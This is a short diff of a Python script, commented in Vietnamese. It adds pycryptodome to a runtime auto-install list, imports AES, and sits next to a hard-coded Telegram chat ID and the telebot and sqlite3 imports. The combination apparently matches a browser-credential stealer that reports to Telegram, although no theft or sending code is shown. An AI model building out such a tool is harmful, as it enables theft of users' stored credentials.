@@ -5,7 +5,7 @@ def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
 # Kiểm tra và cài đặt thư viện nếu cần
-libraries = ['shutil', 'sqlite3', 'telebot', 'asyncio']
+libraries = ['shutil', 'sqlite3', 'telebot', 'asyncio', 'pycryptodome']
 
 for lib in libraries:
     try:
@@ -20,7 +20,7 @@ import json
 import base64
 import telebot
 import asyncio
-
+from Cryptodome.Cipher import AES
 
 
 ID = '-1002061706055'
